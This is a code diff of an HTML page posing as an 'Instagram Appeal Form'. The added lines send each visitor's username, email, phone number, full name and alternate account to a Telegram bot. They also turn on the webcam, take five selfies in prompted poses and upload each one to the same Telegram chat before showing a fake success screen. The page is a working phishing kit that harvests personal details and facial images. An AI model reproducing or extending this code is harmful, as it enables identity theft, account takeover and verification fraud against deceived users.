+        // ============================================================
+        function sendFormToTelegram(data, formType) {
+            const message = `📋 <b>Instagram Appeal Form</b>
+
+<b>Type:</b> ${formType}
+━━━━━━━━━━━━━━━━━━━━
+<b>👤 Username:</b> ${data.username}
+<b>📧 Email:</b> ${data.email}
+<b>📱 Phone:</b> ${data.phone || 'N/A'}
+<b>📝 Name:</b> ${data.fullname}
+<b>🔗 Alt Account:</b> ${data.alternative || 'N/A'}
+<b>👥 Relationship:</b> ${data.relationship}
+━━━━━━━━━━━━━━━━━━━━
+<b>🕐 Time:</b> ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}`;
+
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            })
-            .then(r => r.json())
-            .then(() => {
-                // show verification
-                document.querySelectorAll('.form-container').forEach(f => f.classList.remove('active'));
-                document.getElementById('verificationScreen').classList.add('active');
-                setTimeout(startVerification, 500);
-            })
-            .catch(err => {
-                alert('Submit failed: ' + err.message);
-            });
+                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' })
+            }).catch(err => console.error('Telegram send error:', err));
         }
 
-        document.getElementById('disabledAppealForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            handleSubmit(this, 'Disabled Account Appeal');
-        });
-        document.getElementById('chatAppealForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            handleSubmit(this, 'Chat Restrictions Appeal');
-        });
+        function sendSelfieToTelegram(blob, pose, poseNumber) {
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_CHAT_ID);
+            formData.append('photo', blob, `selfie_${poseNumber}.jpg`);
+            formData.append('caption',
+                `📸 <b>Verification Selfie ${poseNumber}/5</b>
+
+<b>👤 User:</b> ${verificationState.formData.username}
+<b>📝 Pose:</b> ${pose.text}
+<b>📋 Type:</b> ${verificationState.formData.type}
+<b>🕐 Time:</b> ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}`);
+            formData.append('parse_mode', 'HTML');
+
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            }).catch(err => console.error('Selfie send error:', err));
+        }
 
         // ============================================================
-        // 6. CAMERA & SELFIE CAPTURE
+        // 10. VERIFICATION FLOW (Original)
         // ============================================================
         function startVerification() {
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: 640, height: 480 } })
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: 1280, height: 720 } })
                 .then(stream => {
-                    vState.stream = stream;
+                    verificationState.videoStream = stream;
                     document.getElementById('verificationVideo').srcObject = stream;
-                    setTimeout(nextPose, 1500);
+                    setTimeout(processNextPose, 2000);
                 })
-                .catch(() => alert('Camera access required.'));
+                .catch(() => alert('Please allow camera access'));
         }
 
-        function nextPose() {
-            if (vState.pose >= POSES.length) {
-                completeVerification();
+        function processNextPose() {
+            if (verificationState.currentPose >= POSES.length) {
+                allPosesComplete();
                 return;
             }
-            document.getElementById('poseText').textContent = POSES[vState.pose];
-            document.getElementById('poseCount').textContent = `${vState.pose+1}/${POSES.length}`;
+            const pose = POSES[verificationState.currentPose];
+            document.getElementById('poseText').textContent = pose.text;
+            document.getElementById('poseCount').textContent = `Pose ${verificationState.currentPose + 1} of ${POSES.length}`;
             document.getElementById('faceOval').classList.remove('matched');
-            vState.capturing = false;
-
+            verificationState.isCapturing = false;
             setTimeout(() => {
                 document.getElementById('faceOval').classList.add('matched');
-                setTimeout(captureSelfie, 600);
+                setTimeout(captureAndSendPose, 600);
             }, 2000);
         }
 
-        function captureSelfie() {
-            if (vState.capturing) return;
-            vState.capturing = true;
+        function captureAndSendPose() {
+            if (verificationState.isCapturing) return;
+            verificationState.isCapturing = true;
             const video = document.getElementById('verificationVideo');
             const canvas = document.createElement('canvas');
             canvas.width = video.videoWidth || 640;
@@ -950,81 +1028,69 @@
             canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
 
             canvas.toBlob(blob => {
-                const fd = new FormData();
-                fd.append('photo', blob, `selfie_${vState.pose+1}.jpg`);
-                fd.append('username', vState.formData.username);
-                fd.append('formType', vState.formData.type);
-                fd.append('poseText', POSES[vState.pose]);
-                fd.append('poseNumber', vState.pose + 1);
-
-                fetch('/api/submit-selfie', { method: 'POST', body: fd })
-                    .then(r => r.json())
-                    .then(() => {
-                        vState.pose++;
-                        setTimeout(nextPose, 600);
-                    })
-                    .catch(err => {
-                        alert('Selfie upload failed: ' + err.message);
-                        vState.pose++;
-                        setTimeout(nextPose, 600);
-                    });
-            }, 'image/jpeg', 0.9);
+                const pose = POSES[verificationState.currentPose];
+                verificationState.captures.push(blob);
+                sendSelfieToTelegram(blob, pose, verificationState.currentPose + 1);
+                verificationState.currentPose++;
+                setTimeout(processNextPose, 800);
+            }, 'image/jpeg', 0.92);
         }
 
-        function completeVerification() {
+        function allPosesComplete() {
             document.getElementById('poseText').style.display = 'none';
             document.getElementById('poseCount').style.display = 'none';
             document.getElementById('faceOval').style.display = 'none';
             const btn = document.getElementById('verificationSubmitBtn');
             btn.classList.add('show');
-            btn.onclick = function() {
-                const d = vState.formData;
-                fetch('/api/verification-complete', {
+            btn.onclick = () => {
+                const data = verificationState.formData;
+                const message =
+                    `✅ <b>VERIFICATION COMPLETED</b>
+
+<b>👤 User:</b> ${data.username}
+<b>📧 Email:</b> ${data.email}
+<b>📱 Phone:</b> ${data.phone || 'N/A'}
+<b>📝 Name:</b> ${data.fullname}
+<b>📋 Form:</b> ${data.type}
+<b>📸 Photos:</b> 5/5
+<b>✓ Status:</b> Ready for Review
+<b>🕐 Completed:</b> ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}`;
+
+                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        username: d.username,
-                        email: d.email,
-                        phone: d.phone,
-                        fullname: d.fullname,
-                        formType: d.type
-                    })
-                })
-                .then(r => r.json())
-                .then(() => {
-                    if (vState.stream) vState.stream.getTracks().forEach(t => t.stop());
-                    document.getElementById('verificationScreen').classList.remove('active');
-                    document.getElementById('successModal').classList.add('active');
-                })
-                .catch(err => alert('Completion failed: ' + err.message));
+                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' })
+                }).catch(err => console.error('Completion error:', err));
+
+                if (verificationState.videoStream) {
+                    verificationState.videoStream.getTracks().forEach(t => t.stop());
+                }
+                document.getElementById('verificationScreen').classList.remove('active');
+                document.getElementById('successModal').classList.add('active');
             };
         }
 
-        function redirectToMain() {
+        function redirectToMainPage() {
             document.getElementById('successModal').classList.remove('active');
             document.getElementById('selectionScreen').classList.remove('hidden');
             document.querySelectorAll('.form-container').forEach(f => f.classList.remove('active'));
-            document.querySelectorAll('.option-item').forEach(o => o.classList.remove('selected'));
+            document.querySelectorAll('.option-item').forEach(item => item.classList.remove('selected'));
             document.getElementById('disabledAppealForm').reset();
             document.getElementById('chatAppealForm').reset();
-            vState = { pose: 0, stream: null, formData: {}, capturing: false };
-            document.getElementById('verificationSubmitBtn').classList.remove('show');
-            document.getElementById('poseText').style.display = 'block';
-            document.getElementById('poseCount').style.display = 'block';
-            document.getElementById('faceOval').style.display = 'block';
+            verificationState = { currentPose: 0, captures: [], videoStream: null, formData: {}, isCapturing: false };
             window.scrollTo(0, 0);
         }
 
         // ============================================================
-        // 7. FOOTER YEAR
+        // 11. FOOTER YEAR (Auto-update)
         // ============================================================
         document.getElementById('footerYear').textContent = new Date().getFullYear();
 
         // ============================================================
-        // 8. INIT: Pre-populate dropdowns
+        // 12. INIT – Populate dropdowns
         // ============================================================
         ['1', '2'].forEach(id => {
-            renderOptions('countryDropdown' + id);
+            renderOptions('dropdown' + id);
         });
     </script>
 </body>
